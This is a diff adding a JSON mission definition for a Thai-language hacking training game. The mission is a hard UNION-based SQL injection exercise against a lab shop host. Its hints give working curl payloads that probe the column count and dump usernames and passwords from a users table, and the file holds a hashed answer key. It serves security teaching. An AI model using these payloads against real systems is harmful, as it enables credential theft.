@@ -1,0 +1,68 @@
+{
+  "id": "c04-m04",
+  "chapter": "c04",
+  "title": "SQL Injection: UNION-based Extraction",
+  "difficulty": "hard",
+  "xp": 400,
+  "estMinutes": 20,
+  "lesson": "c04-l02",
+  "briefing": "ช่อง /search ของ ShopZone ก็เสี่ยงต่อ SQL injection เหมือนกัน ลองใช้เทคนิค UNION เพื่อดึงชื่อผู้ใช้และรหัสผ่านของทุกบัญชีออกมาทั้งหมด",
+  "scope": {
+    "inScope": [
+      "shop.acme.test — 10.10.20.9"
+    ],
+    "outOfScope": [
+      "เครื่องอื่นทั้งหมด"
+    ],
+    "ips": [
+      "10.10.20.9"
+    ]
+  },
+  "machine": "training-box",
+  "startUser": "kali",
+  "objectives": [
+    {
+      "id": "o1",
+      "text": "ลองหาจำนวนคอลัมน์ด้วย UNION SELECT",
+      "type": "http",
+      "path": "^/search$",
+      "query": "union"
+    },
+    {
+      "id": "o2",
+      "text": "ดึง username กับ password ของทุกบัญชีออกมาแสดงในผลการค้นหา",
+      "type": "http",
+      "path": "^/search$",
+      "response": "alice123"
+    },
+    {
+      "id": "o3",
+      "text": "รหัสผ่านของบัญชี admin ที่ดึงออกมาได้คือ?",
+      "type": "answer",
+      "answerHash": "d3641fd021a3e04a83b7347cbb4121fd24f78c1da5bc2f1c694b4791abe8f2db"
+    }
+  ],
+  "hints": [
+    {
+      "cost": 10,
+      "text": "`curl -s \"http://shop.acme.test/search?q=zzz' ORDER BY 4-- -\"` จะ error เพราะมีแค่ 3 คอลัมน์"
+    },
+    {
+      "cost": 25,
+      "text": "ใช้ `curl -s -G --data-urlencode \"q=zzz' UNION SELECT id,concat(username,':',password),0 FROM users-- -\" http://shop.acme.test/search` (ใช้ -G --data-urlencode เพื่อส่งอักขระพิเศษอย่างปลอดภัย)"
+    }
+  ],
+  "debrief": [
+    "UNION SELECT รวมผลลัพธ์ของ query ที่สองเข้ากับ query เดิม เมื่อจำนวนคอลัมน์ตรงกัน (3 คอลัมน์ในกรณีนี้) คุณ \"ยืม\" ช่องแสดงชื่อสินค้ามาแสดงข้อมูลจากตาราง users แทนได้เลย",
+    "นี่คือตัวอย่างสมบูรณ์ของการขยายผลจาก SQLi เดียว ไปสู่การขโมยข้อมูลผู้ใช้ **ทั้งระบบ** ไม่ใช่แค่บัญชีเดียว — ความเสียหายจาก SQLi มักไม่หยุดแค่ bypass login"
+  ],
+  "references": [
+    "OWASP Top 10 A05:2025 Injection",
+    "CWE-89 SQL Injection",
+    "OWASP WSTG-INPV-05 Testing for SQL Injection"
+  ],
+  "owasp": {
+    "2025": "A05",
+    "2021": "A03"
+  }
+}
